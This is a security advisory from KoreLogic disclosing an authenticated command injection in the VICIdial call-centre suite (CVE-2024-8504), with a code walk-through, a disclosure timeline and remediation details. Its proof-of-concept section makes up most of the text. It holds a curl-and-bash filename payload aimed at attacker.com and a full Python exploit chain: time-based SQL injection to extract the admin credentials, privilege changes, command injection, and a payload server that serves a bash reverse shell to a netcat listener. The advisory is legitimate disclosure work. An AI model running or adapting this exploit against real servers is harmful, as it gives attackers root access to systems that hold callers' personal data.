-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2024-012: VICIdial Authenticated Remote Code Execution
Title: VICIdial Authenticated Remote Code Execution
Advisory ID: KL-001-2024-012
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-012.txt
1. Vulnerability Details
Affected Vendor: VICIdial
Affected Product: VICIdial
Affected Version: 2.14-917a
Platform: GNU/Linux
CWE Classification: CWE-78: Improper Neutralization of Special
Elements used in an OS Command
('OS Command Injection')
CVE ID: CVE-2024-8504
2. Vulnerability Description
An attacker with authenticated access to VICIdial as an "agent"
can execute arbitrary shell commands as the "root" user. This
attack can be chained with CVE-2024-8503 to execute arbitrary
shell commands starting from an unauthenticated perspective.
3. Technical Description
VICIdial is an open-source contact center suite, mainly used
by call centers. The "vicidial.com" website boasts over 14,000
registered installations. There is a public SVN repository to
access the source code, as well as an ISO that can be used to
install the software. The ISO was used in a virtual machine
for testing purposes.
Users can be added to specific "groups" that enable them to log
into the "agent" web client if that group is associated with a
"campaign". This web client is for agents to manage inbound
and outbound phone calls, displaying pertinent information
regarding the "lead", such as the personal information of the
individual on the other end of the call.
An agent has the ability to record the phone call using the
"START RECORDING" button. When clicked, an HTTP request is sent
to the server which is processed by the "manager\_send.php"
PHP script. The "filename" parameter included in the request
is sanitized with the "preg\_replace" PHP function to prevent
SQL injection, as shown by this snippet:
if (isset($\_GET["filename"])) {$filename=$\_GET["filename"];}
elseif (isset($\_POST["filename"])) {$filename=$\_POST["filename"];}
...
$filename = preg\_replace("/\'|\"|\\\\|;/","",$filename);
The regular expression used to sanitize this parameter is
very permissive, only removing single quotes, double quotes,
backslashes, and semicolons.
Later in the execution of "manager\_send.php", the "filename"
variable is added to a SQL database through an "INSERT"
statement, along with other user-controlled variables such as
"exten":
$stmt="INSERT INTO vicidial\_manager values('','','$NOW\_TIME',
'NEW','N','$server\_ip','','Originate','$vmgr\_callerid',
'Channel: $channel','Context: $ext\_context',
'Exten: $exten','Priority: $ext\_priority',
'Callerid: $filename','','','','','');";
if ($format=='debug') {echo "\n";}
$rslt=mysql\_to\_mysqli($stmt, $link);
On the server-side, an asyncronous cron job is executing the
perl script "ADMIN\_keepalive\_ALL.pl":
vicibox11:/ # crontab -l | grep keepalive
### keepalive script for astguiclient processes
\* \* \* \* \* /usr/share/astguiclient/ADMIN\_keepalive\_ALL.pl
This perl script ensures several worker perl scripts
are running. Included in these worker perl scripts is
"AST\_manager\_send.pl", as shown by this snippet from
"ADMIN\_keepalive\_ALL.pl":
if ($psline[1] =~ /AST\_manager\_se/)
{
$runningAST\_send++;
if ($DB) {print "AST\_send RUNNING: |$psline[1]|\n";}
}
...
if ( ($AST\_send\_listen > 0) && ($runningAST\_send < 1) )
{
if ($DB) {print "starting AST\_manager\_send...\n";}
# add a '-L' to the command below to activate logging
`/usr/bin/screen -d -m -S ASTsend
$PATHhome/AST\_manager\_send.pl $debug\_string`;
The "AST\_manager\_send.pl" script will continuously monitor the
"vicidial\_manager" table in the SQL database for records with
the "status" column equal the string "NEW". Values from that
row are then URL-encoded and used as command-line arguments
to invoke the "AST\_send\_action\_child.pl" perl script:
while ($endless\_loop > 0)
{
my $stmtA = "SELECT count(\*) from
vicidial\_manager where server\_ip = '"
. $conf{VARserver\_ip} . "' and status = 'NEW';";
...
$originate\_command .= $vdm->{cmd\_line\_e} . "\n"
if ($vdm->{cmd\_line\_e});
$originate\_command .= $vdm->{cmd\_line\_f} . "\n"
if ($vdm->{cmd\_line\_f});
$originate\_command .= $vdm->{cmd\_line\_g} . "\n"
if ($vdm->{cmd\_line\_g});
...
$vdm->{cmd\_line\_e} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_f} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_g} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
...
$launch .= " --cmd\_line\_e=" . $vdm->{cmd\_line\_e}
if ($vdm->{cmd\_line\_e});
$launch .= " --cmd\_line\_f=" . $vdm->{cmd\_line\_f}
if ($vdm->{cmd\_line\_f});
$launch .= " --cmd\_line\_g=" . $vdm->{cmd\_line\_g}
if ($vdm->{cmd\_line\_g});
...
$launch .= " >> " . $conf{PATHlogs} . "/action\_send." . logDate()
if ($SYSLOG);
system($launch . ' &');
The "AST\_send\_action\_child.pl" will then initiate a telnet
connection to the "Asterisk Call Manager" and issue various
commands as they appear in the command-line arguments:
my $tn = new Net::Telnet (Port => $telnet\_port,
Prompt => '/\r\n/',
Output\_record\_separator => '',
Errmode => "return");
...
$tn->open("$telnet\_host");
$tn->waitfor('/Asterisk Call Manager\//');
...
$originate\_command .= $cmd\_line\_e . "\n" if ($cmd\_line\_e);
$originate\_command .= $cmd\_line\_f . "\n" if ($cmd\_line\_f);
$originate\_command .= $cmd\_line\_g . "\n" if ($cmd\_line\_g);
...
my @list\_channels = $tn->cmd(String => $originate\_command,
Prompt => '/.\*/');
These commands are then processed by the Asterisk
Management interface (AMI). The configuration file
"extensions-vicidial.conf" contains useful information on
how AMI processes the value of the user-controlled "Exten"
command. The following is a relevant snippet:
exten => 8309,1,Answer
exten => 8309,2,Monitor(wav,${CALLERID(name)})
exten => 8309,3,Wait(3600)
exten => 8309,4,Hangup()
...
When supplying an "Exten" value of "8309", the "Monitor"
application is invoked, which will record the current call and
write the recorded data into a file. The default directory
is "/var/spool/asterisk/monitor". In this case, the name
of the file is derived from the "CALLERID", which is also
user-controlled.
This can be leveraged by an attacker to write file names
that contain malicious shell commands. Take for example the
following HTTP request:
POST /agc/manager\_send.php HTTP/1.1
Host: REDACTED
Content-Length: 279
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
server\_ip=REDACTED&session\_name=1716765726\_8300defaul17394646&user=korelogic&pass=korelogic&ACTION=MonitorConf&format=text&channel=Local/58600051@default&filename=3133731337$(id>foobar.txt)&exten=8309&ext\_context=default&lead\_id=&ext\_priority=1&FROMvdc=YES&uniqueid=&FROMapi=
Two files are created within the "/var/spool/asterisk/monitor"
directory:
vicibox11:/ # ls -l /var/spool/asterisk/monitor
total 216
-rw-r--r-- 1 root root 213164 May 30 05:30 \
3133731337$(id>foobar.txt)-in.wav
-rw-r--r-- 1 root root 44 May 30 05:30 \
3133731337$(id>foobar.txt)-out.wav
Additionally, the "AST\_CRON\_audio\_1\_move\_VDonly.pl" perl script
is executed every 3 minutes:
vicibox11:/ # crontab -l | grep VDonly
0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45,48,51,54,57 \* \* \* \* \
/usr/share/astguiclient/AST\_CRON\_audio\_1\_move\_VDonly.pl
This script searches for WAV/GSM files within the Asterisk
monitor directory and uses the file names to execute several
shell commands:
foreach(@FILES)
{
...
$INfile = $FILES[$i];
...
if (!$T)
{
`mv -f "$dir1/$INfile" "$dir2/$ALLfile"`;
`rm -f "$dir1/$OUTfile"`;
}
The malicious file name is then inserted into the "mv"
command. The attacker controlled "id" command is executed and
the output is redirected to the file "foo.txt":
vicibox11:/ # ls -l /root/foobar.txt
-rw-r--r-- 1 root root 39 May 30 05:33 /root/foobar.txt
4. Mitigation and Remediation Recommendation
This issue has been remediated in the public svn/trunk codebase,
as of revision 3848 committed 2024-07-08.
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic,
Inc.
6. Disclosure Timeline
2024-07-05 : KoreLogic requests security contact from
support@vicidial.com.
2024-07-08 : KoreLogic reports vulnerability details to VICIdial
contact.
2024-07-08 : VICIdial notifies KoreLogic that the issue has been
remediated with revision 3848 in the public
Subversion repository.
2024-07-11 : KoreLogic confirms this vulnerability has been
remediated. KoreLogic asks VICIdial if it is
appropriate to publicly disclose the vulnerability
details at this time.
2024-07-11 : VICIdial requests four weeks of embargo in order to
upgrade supported customers.
2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
publicly disclose the vulnerability details at
this time.
2024-08-09 : VICIdial requests an additional two weeks of
embargo.
2024-09-10 : KoreLogic public disclosure.
7. Proof of Concept
Instead of executing the "id" command, a malicious bash script
can be downloaded and executing using the cURL utility. The following
file name is an example:
$(curl$IFS@attacker.com$IFS-o$IFS.c&&bash$IFS.c)
This issue can be chained with KL-001-2024-011 (unauthenticated SQL injection)
to execute arbitrary shell commands as the root user from an unauthenticated
perspective:
[goon@security exploits]$ python unauth2rce.py -rh 192.168.2.136 -rp 443 -wh 192.168.2.65 -wp 3000 -lh 192.168.2.65 -lp 1337 --bind
[+] Target appears vulnerable to time-based SQL injection
[~] Enumerating administrator credentials
[~] 6
[~] 66
[~] 666
[~] 6666
[+] Username: 6666
[~] J
[~] JA
[~] JAB
[~] JAB1
[~] JAB18
[~] JAB181
[~] JAB181M
[~] JAB181MA
[~] JAB181MAB
[~] JAB181MAB1
[~] JAB181MAB17
[~] JAB181MAB178
[~] JAB181MAB178\_
[~] JAB181MAB178\_L
[~] JAB181MAB178\_LA
[~] JAB181MAB178\_LAn
[+] Password: JAB181MAB178\_LAn
[+] Authenticated successfully as user "6666"
[+] Updated user settings to increase privileges
[+] Updated system settings
[+] Created dummy campaign "korelogic\_campaign"
[+] Updated dummy campaign settings
[+] Created dummy list for campaign
[+] Found phone credentials: callin:test
[+] Entered "manager" credentials to override shift enforcement
[+] Authenticated as agent using phone credentials
[~] Listening for incoming connections...
[+] Received cURL request from 192.168.2.136
Connection from 192.168.2.136:56980
vicibox11:~ # id
uid=0(root) gid=0(root) groups=0(root)
#########################
## unauth2rce.py ##
#########################
import os
import re
import socket
import string
import random
import urllib3
import argparse
import requests
import threading
from base64 import b64encode
from bs4 import BeautifulSoup
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
class Exploit:
def \_\_init\_\_(self, rhost, rport, whost, wport, lhost=None, lport=None, bind=False, proxy=None):
"""
This 'sleep' duration is derived by the average response time
multiplied by this value. A server with an average response time
of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
"""
self.SLEEP\_MULTIPLIER = 30
self.REQUEST\_HEADERS = {'User-Agent': 'KoreLogic'}
self.ALLOWED\_SCHEMES = ['http', 'https']
if proxy:
self.REQUEST\_PROXIES = {
'http': proxy,
'https': proxy
}
else:
self.REQUEST\_PROXIES = {}
self.TARGET\_IP = rhost
self.TARGET\_PORT = rport
self.PAYLOAD\_WEBSERVER\_HOST = whost
self.PAYLOAD\_WEBSERVER\_PORT = wport
self.REVERSE\_SHELL\_HOST = lhost
self.REVERSE\_SHELL\_PORT = lport
self.BIND = bind
self.VICIDIAL\_FINGERPRINT = 'Please Hold while I redirect you!'
self.RANDOM\_CHARSET = string.ascii\_uppercase + string.digits
# returns a URI with 'http' or 'https'
def determine\_target\_uri(self):
for scheme in self.ALLOWED\_SCHEMES:
target\_uri = f'{scheme}://{self.TARGET\_IP}:{self.TARGET\_PORT}'
try:
response = requests.get(target\_uri, headers=self.REQUEST\_HEADERS, verify=False)
if self.VICIDIAL\_FINGERPRINT in response.text:
return target\_uri
except:
pass
# returns a session object with custom proxies/headers if supplied
def build\_requests\_session(self):
self.base\_uri = self.determine\_target\_uri()
session = requests.Session()
session.proxies = self.REQUEST\_PROXIES
session.verify = False
return session
# returns a random string of a given length
def random(self, length):
return ''.join(random.choice(self.RANDOM\_CHARSET) for \_ in range(length))
# returns a timedelta representing the response time of an injected SQL query
def time\_sql\_query(self, query, session):
username = f"goolicker', '', ({query}));# "
credentials = f'{username}:password'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/VERM/VERM\_AJAX\_functions.php'
request\_params = {'function': 'log\_custom\_report', self.random(5): self.random(5)}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
return response.elapsed
# returns a boolean if time-based SQL injection is possible, additionally
# sets the best 'sleep' duration based on response times
def is\_vulnerable(self, session, baseline\_iterations=5):
# determine average baseline response time
zero\_sleep\_query = f'SELECT (NULL)'
total\_baseline\_time = 0
for \_ in range(baseline\_iterations):
execution\_time = self.time\_sql\_query(zero\_sleep\_query, session)
total\_baseline\_time += execution\_time.total\_seconds()
average\_baseline\_response\_time = total\_baseline\_time / baseline\_iterations
self.sql\_baseline\_time = average\_baseline\_response\_time
# determine if injected sleep query impacts response time
sleep\_length = round(average\_baseline\_response\_time \* self.SLEEP\_MULTIPLIER, 2)
sleep\_query = f'SELECT (sleep({sleep\_length}))'
execution\_time = self.time\_sql\_query(sleep\_query, session)
if execution\_time.total\_seconds() >= sleep\_length:
self.sql\_sleep\_length = sleep\_length
return True
else:
return False
# determine if a character at a specific indice of a query result returns a
# boolean 'true' when compared to a given character using the supplied operator
def check\_indice\_of\_query\_result(self, session, query, indice, operator, ordinal):
parent\_query = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, sleep({self.sql\_sleep\_length}), null)'
execution\_time = self.time\_sql\_query(parent\_query, session)
return execution\_time.total\_seconds() >= (self.sql\_baseline\_time \* self.SLEEP\_MULTIPLIER)
def enumerate\_sql\_query(self, session, query='SELECT @@version', charset=string.printable):
# convert charset to ordinals
all\_characters = sorted([ord(char) for char in charset])
reduced\_characters = all\_characters
# use a binary search and enumerate query results
result = ''
indice = 1
indice\_could\_be\_null = True
while True:
"""
we check if the value is NULL once per indice
to determine when a string ends. this adds one
request per indice, but since every boolean 'true'
results in a delay this is faster than counting
the length of the string before enumrating.
"""
if indice\_could\_be\_null:
if self.check\_indice\_of\_query\_result(session, query, indice, '=', '0'):
break
else:
indice\_could\_be\_null = False
# enumerate each character of query result with a binary search
middle\_indice = len(reduced\_characters) // 2
middle\_ordinal = reduced\_characters[middle\_indice]
if self.check\_indice\_of\_query\_result(session, query, indice, '<=', middle\_ordinal):
if self.check\_indice\_of\_query\_result(session, query, indice, '=', middle\_ordinal):
reduced\_characters = all\_characters
result += chr(middle\_ordinal)
indice += 1
indice\_could\_be\_null = True
print(f'[~] {result}')
else:
reduced\_characters = reduced\_characters[:middle\_indice]
else:
reduced\_characters = reduced\_characters[middle\_indice:]
return result
def poison\_recording\_files(self, session, username, password):
# authenticate using administrator credentials
credentials = f'{username}:{password}'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/vicidial/admin.php'
request\_params = {'ADD': '3', 'user': username}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
if response.status\_code == 200:
print(f'[+] Authenticated successfully as user "{username}"')
else:
print('[-] Failed to authenticate with credentials. Maybe hashing is enabled?')
return
# update user settings to increase privileges beyond default administrator
user\_settings\_body = {
"ADD":"4A","custom\_fields\_modify":"0","user":username,"DB":"0","pass":password,
"force\_change\_password":"N","full\_name":"KoreLogic","user\_level":"9",
"user\_group":"ADMIN","phone\_login":"KoreLogic","phone\_pass":"KoreLogic",
"active":"Y","voicemail\_id":"","email":"","mobile\_number":"","user\_code":"",
"user\_location":"","user\_group\_two":"","territory":"","user\_nickname":"",
"user\_new\_lead\_limit":"-1","agent\_choose\_ingroups":"1","agent\_choose\_blended":"1",
"hotkeys\_active":"0","scheduled\_callbacks":"1","agentonly\_callbacks":"0",
"next\_dial\_my\_callbacks":"NOT\_ACTIVE","agentcall\_manual":"0","manual\_dial\_filter":"DISABLED",
"agentcall\_email":"0","agentcall\_chat":"0","vicidial\_recording":"1","vicidial\_transfers":"1",
"closer\_default\_blended":"0","user\_choose\_language":"0","selected\_language":"default+English",
"vicidial\_recording\_override":"DISABLED","mute\_recordings":"DISABLED",
"alter\_custdata\_override":"NOT\_ACTIVE","alter\_custphone\_override":"NOT\_ACTIVE",
"agent\_shift\_enforcement\_override":"ALL","agent\_call\_log\_view\_override":"Y",
"hide\_call\_log\_info":"Y","agent\_lead\_search":"NOT\_ACTIVE","lead\_filter\_id":"NONE",
"user\_hide\_realtime":"0","allow\_alerts":"0","preset\_contact\_search":"NOT\_ACTIVE",
"max\_inbound\_calls":"0","max\_inbound\_filter\_enabled":"0","max\_inbound\_filter\_min\_sec":"-1",
"inbound\_credits":"-1","max\_hopper\_calls":"0","max\_hopper\_calls\_hour":"0",
"wrapup\_seconds\_override":"-1","ready\_max\_logout":"-1","status\_group\_id":"",
"campaign\_js\_rank\_select":"","campaign\_js\_grade\_select":"","ingroup\_js\_rank\_select":"",
"ingroup\_js\_grade\_select":"","RANK\_AGENTDIRECT":"0","GRADE\_AGENTDIRECT":"10",
"LIMIT\_AGENTDIRECT":"-1","WEB\_AGENTDIRECT":"","RANK\_AGENTDIRECT\_CHAT":"0",
"GRADE\_AGENTDIRECT\_CHAT":"10","LIMIT\_AGENTDIRECT\_CHAT":"-1","WEB\_AGENTDIRECT\_CHAT":"",
"custom\_one":"","custom\_two":"","custom\_three":"","custom\_four":"","custom\_five":"",
"qc\_enabled":"0","qc\_user\_level":"1","qc\_pass":"0","qc\_finish":"0","qc\_commit":"0",
"hci\_enabled":"0","realtime\_block\_user\_info":"0","admin\_hide\_lead\_data":"0",
"admin\_hide\_phone\_data":"0","ignore\_group\_on\_search":"0","user\_admin\_redirect\_url":"",
"view\_reports":"1","access\_recordings":"0","alter\_agent\_interface\_options":"1",
"modify\_users":"1","change\_agent\_campaign":"1","delete\_users":"1","modify\_usergroups":"1",
"delete\_user\_groups":"1","modify\_lists":"1","delete\_lists":"1","load\_leads":"1",
"modify\_leads":"1","export\_gdpr\_leads":"0","download\_lists":"1","export\_reports":"1",
"delete\_from\_dnc":"1","modify\_campaigns":"1","campaign\_detail":"1","modify\_dial\_prefix":"1",
"delete\_campaigns":"1","modify\_ingroups":"1","delete\_ingroups":"1","modify\_inbound\_dids":"1",
"delete\_inbound\_dids":"1","modify\_custom\_dialplans":"1","modify\_remoteagents":"1",
"delete\_remote\_agents":"1","modify\_scripts":"1","delete\_scripts":"1","modify\_filters":"1",
"delete\_filters":"1","ast\_admin\_access":"1","ast\_delete\_phones":"1","modify\_call\_times":"1",
"delete\_call\_times":"1","modify\_servers":"1","modify\_shifts":"1","modify\_phones":"1",
"modify\_carriers":"1","modify\_email\_accounts":"0","modify\_labels":"1","modify\_colors":"1",
"modify\_languages":"0","modify\_statuses":"1","modify\_voicemail":"1","modify\_audiostore":"1",
"modify\_moh":"1","modify\_tts":"1","modify\_contacts":"1","callcard\_admin":"1",
"modify\_auto\_reports":"0","add\_timeclock\_log":"1","modify\_timeclock\_log":"1",
"delete\_timeclock\_log":"1","manager\_shift\_enforcement\_override":"1","pause\_code\_approval":"1",
"admin\_cf\_show\_hidden":"0","modify\_ip\_lists":"0","ignore\_ip\_list":"0",
"two\_factor\_override":"NOT\_ACTIVE","vdc\_agent\_api\_access":"1","api\_list\_restrict":"0",
"api\_allowed\_functions%5B%5D":"ALL\_FUNCTIONS","api\_only\_user":"0","modify\_same\_user\_level":"1",
"download\_invalid\_files":"1","alter\_admin\_interface\_options":"1","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=user\_settings\_body)
print('[+] Updated user settings to increase privileges')
# update system settings without clobbering existing configuration
response = session.get(target\_uri, headers=request\_headers, params={'ADD':'311111111111111'})
soup = BeautifulSoup(response.text, 'html.parser')
form\_tag = soup.find('form')
system\_settings\_body = {}
for input\_tag in form\_tag.find\_all('input'):
setting\_name = input\_tag['name']
setting\_value = input\_tag['value']
system\_settings\_body[setting\_name] = setting\_value
for select\_tag in form\_tag.find\_all('select'):
setting\_name = select\_tag['name']
selected\_tag = select\_tag.find('option', selected=True)
if not selected\_tag:
continue
setting\_value = selected\_tag.text
system\_settings\_body[setting\_name] = setting\_value
system\_settings\_body['outbound\_autodial\_active'] = '0'
response = session.post(target\_uri, headers=request\_headers, data=system\_settings\_body)
print('[+] Updated system settings')
# create dummy campaign
campaign\_settings\_body = {
"ADD":"21","park\_ext":"","campaign\_id":"313373","campaign\_name":"korelogic\_campaign",
"campaign\_description":"","user\_group":"---ALL---","active":"Y","park\_file\_name":"",
"web\_form\_address":"","allow\_closers":"Y","hopper\_level":"1","auto\_dial\_level":"0",
"next\_agent\_call":"random","local\_call\_time":"12pm-5pm","voicemail\_ext":"","script\_id":"",
"get\_call\_launch":"NONE","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=campaign\_settings\_body)
print('[+] Created dummy campaign "korelogic\_campaign"')
# update dummy campaign
update\_campaign\_body = {
"ADD":"41","campaign\_id":"313373","old\_campaign\_allow\_inbound":"Y",
"campaign\_name":"korelogic\_campaign","active":"Y","dial\_status":"","lead\_order":"DOWN",
"list\_order\_mix":"DISABLED","lead\_filter\_id":"NONE", "no\_hopper\_leads\_logins":"Y",
"hopper\_level":"1","reset\_hopper":"N","dial\_method":"RATIO","auto\_dial\_level":"1",
"adaptive\_intensity":"0","SUBMIT":"SUBMIT","form\_end":"END"
}
response = session.post(target\_uri, headers=request\_headers, data=update\_campaign\_body)
print('[+] Updated dummy campaign settings')
# create dummy list
list\_settings\_body = {
"ADD":"211","list\_id":"313374","list\_name":"korelogic\_list","list\_description":"",
"campaign\_id":"313373","active":"Y","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=list\_settings\_body)
print('[+] Created dummy list for campaign')
# fetch credentials for a phone login
response = session.get(target\_uri, headers=request\_headers, params={'ADD':'10000000000'})
soup = BeautifulSoup(response.text, 'html.parser')
phone\_uri\_path = soup.find('a', string='MODIFY')['href']
response = session.get(f'{self.base\_uri}{phone\_uri\_path}', headers=request\_headers)
soup = BeautifulSoup(response.text, 'html.parser')
phone\_extension = soup.find('input', {'name': 'extension'})['value']
phone\_password = soup.find('input', {'name': 'pass'})['value']
recording\_extension = soup.find('input', {'name': 'recording\_exten'})['value']
print(f'[+] Found phone credentials: {phone\_extension}:{phone\_password}')
# authenticate to agent portal with phone credentials
manager\_login\_body = {
"DB":"0","JS\_browser\_height":"1313","JS\_browser\_width":"2560","phone\_login":phone\_extension,
"phone\_pass":phone\_password,"LOGINvarONE":"","LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"",
"LOGINvarFIVE":"","hide\_relogin\_fields":"","VD\_login":username,"VD\_pass":password,
"MGR\_override":"1","relogin":"YES","VD\_login":username,"VD\_pass":password,
"MGR\_login20240530":username,"MGR\_pass20240530":password,"SUBMIT":"SUBMIT"
}
response = session.post(f'{self.base\_uri}/agc/vicidial.php', headers=request\_headers, data=manager\_login\_body)
print(f'[+] Entered "manager" credentials to override shift enforcement')
agent\_login\_body = {
"DB":"0","JS\_browser\_height":"1313","JS\_browser\_width":"2560","admin\_test":"","LOGINvarONE":"",
"LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"","LOGINvarFIVE":"","phone\_login":phone\_extension,
"phone\_pass":phone\_password,"VD\_login":username,"VD\_pass":password,"VD\_campaign":"313373",
}
response = session.post(f'{self.base\_uri}/agc/vicidial.php', headers=request\_headers, data=agent\_login\_body)
print(f'[+] Authenticated as agent using phone credentials')
# insert malicious recording
session\_name = re.findall(r"var session\_name = '([a-zA-Z0-9\_]+?)';", response.text)[0]
session\_id = re.findall(r"var session\_id = '([0-9]+?)';", response.text)[0]
malicious\_filename = f"3133731337$(curl$IFS@{self.PAYLOAD\_WEBSERVER\_HOST}:{self.PAYLOAD\_WEBSERVER\_PORT}$IFS-o$IFS.c&&bash$IFS.c)"
record1\_body = {
"server\_ip":self.TARGET\_IP,"session\_name":session\_name,"user":username,"pass":password,
"ACTION":"MonitorConf","format":"text","channel":f"Local/{recording\_extension}@default","filename":malicious\_filename,
"exten":recording\_extension,"ext\_context":"default","lead\_id":"","ext\_priority":"1","FROMvdc":"YES",
"uniqueid":"","FROMapi":""
}
response = session.post(f'{self.base\_uri}/agc/manager\_send.php', headers=request\_headers, data=record1\_body)
recording\_id = re.findall(r'RecorDing\_ID: ([0-9]+)', response.text)[0]
# stop malicious recording to prevent file size from growing
record2\_body = {
"server\_ip":self.TARGET\_IP,"session\_name":session\_name,"user":username,
"pass":password,"ACTION":"StopMonitorConf","format":"text","channel":f"Local/{recording\_extension}@default",
"filename":f"ID:{recording\_id}","exten":session\_id,"ext\_context":"default","lead\_id":"","ext\_priority":"1",
"FROMvdc":"YES","uniqueid":"","FROMapi":""
}
response = session.post(f'{self.base\_uri}/agc/conf\_exten\_check.php', headers=request\_headers, data=record2\_body)
# returns administrator username and password by
# exploiting time-based SQL injection.
def extract\_admin\_credentials(self, session):
print('[~] Enumerating administrator credentials')
username\_charset = string.ascii\_letters + string.digits
admin\_username\_query = "SELECT user FROM vicidial\_users WHERE user\_level = 9 AND modify\_same\_user\_level = '1' LIMIT 1"
admin\_username = self.enumerate\_sql\_query(session, admin\_username\_query, username\_charset)
print(f'[+] Username: {admin\_username}')
password\_charset = string.ascii\_letters + string.digits + '-.+/=\_'
admin\_password\_query = f"SELECT pass FROM vicidial\_users WHERE user = '{admin\_username}' LIMIT 1"
admin\_password = self.enumerate\_sql\_query(session, admin\_password\_query, password\_charset)
print(f'[+] Password: {admin\_password}')
return admin\_username, admin\_password
# emulates a webserver to deliver exploit script
def payload\_webserver(self):
server = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
server.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
server.bind((self.PAYLOAD\_WEBSERVER\_HOST, int(self.PAYLOAD\_WEBSERVER\_PORT)))
server.listen(1)
while True:
client, incoming\_address = server.accept()
message = client.recv(100)
if b'User-Agent: curl' in message:
break
else:
client.close()
print(f'[+] Received cURL request from {incoming\_address[0]}')
exploit\_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{self.REVERSE\_SHELL\_HOST}/{self.REVERSE\_SHELL\_PORT} 0>&1"
http\_response = f"HTTP/1.1 200 OK\r\n"
http\_response += f"Content-Length: {len(exploit\_script)}\r\n\r\n"
http\_response += exploit\_script
client.sendall(http\_response.encode())
client.close()
# starts a netcat process to catch the incoming reverse shell
def netcat\_listener(self):
os.system(f'nc -nlvs {self.REVERSE\_SHELL\_HOST} -p {self.REVERSE\_SHELL\_PORT}')
# binds to provided addresses and handles incoming connections
def prepare\_listeners(self):
webserver = threading.Thread(target=self.payload\_webserver)
netcat = threading.Thread(target=self.netcat\_listener)
print('[~] Listening for incoming connections...')
netcat.start()
webserver.start()
# establish a reverse shell as root from the vicidial instance
def shell(self):
session = self.build\_requests\_session()
is\_vulnerable = self.is\_vulnerable(session)
if is\_vulnerable:
print('[+] Target appears vulnerable to time-based SQL injection')
else:
print('[-] Failed to perform time-based SQL injection')
return
username, password = self.extract\_admin\_credentials(session)
self.poison\_recording\_files(session, username, password)
# prepare exploit listeners if configured
if self.BIND: self.prepare\_listeners()
if \_\_name\_\_ == '\_\_main\_\_':
argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi to RCE as root')
required = argparser.add\_argument\_group('Required Arguments')
optional = argparser.add\_argument\_group('Optional Arguments')
required.add\_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
required.add\_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
required.add\_argument('-wh', '--whost', required=True, help='Malicious webserver IP address')
required.add\_argument('-wp', '--wport', required=True, help='Malicious webserver port number')
required.add\_argument('-lh', '--lhost', required=False, help='Reverse shell listener IP address')
required.add\_argument('-lp', '--lport', required=False, help='Reverse shell listener port number')
optional.add\_argument('-b', '--bind', required=False, help='Bind to [lhost:lport] and [whost:wport] and handle connections automatically', action='store\_true', default=False)
optional.add\_argument('-p', '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', default=None)
arguments = argparser.parse\_args()
exploit = Exploit(
rhost = arguments.rhost,
rport = arguments.rport,
whost = arguments.whost,
wport = arguments.wport,
lhost = arguments.lhost,
lport = arguments.lport,
bind = arguments.bind,
proxy = arguments.proxy
)
exploit.shell()
The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCAA4FiEEB12WYZwbVwYTJ/b2DKLsCTlWkekFAmbgmb8aHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQDKLsCTlWkel6bQ/8DXRaVDMQUEv6YilGkiJC
+sar3UxTgMlvkt8uLH/3qXLAf1KhLTxZ2GWQdpvQ7HDqauHqQNglyHgCQyj678AJ
Hcg560KGfplziyPa6du1Av42eSuK2QM+7M2UOg2Bh3OhT6sPUZyTLqRCQ6RU7Mxa
UvqkamWscehk6BvIwGvStNLT0AxYtSh6fKnndIcAlgfqQWSkQv5bDpEU8gOu1qkO
MLIkUCXVGohlyyr8IcJlA2HF5yd+CHB0+lxr/UHu0UOJAPPDjmBkuuivCGznK8US
GmWrAwP8ICYdKxwEJec8suHocHeCMbFicce5X4frCDXPV4jGWksZDNVdrUdZm8wJ
mo3CrsRE1S7RjmCRVPHZXxDGZrv8HDXC2IQXMLTIMDe0ZNHzmyDC03XEqQRF5YUI
YWp+KbJ8MUhyUxjqO7vmRoA65x5Ckjy2u+R3Mzu8byuLSRvCXWsyGa/CSemUu/bj
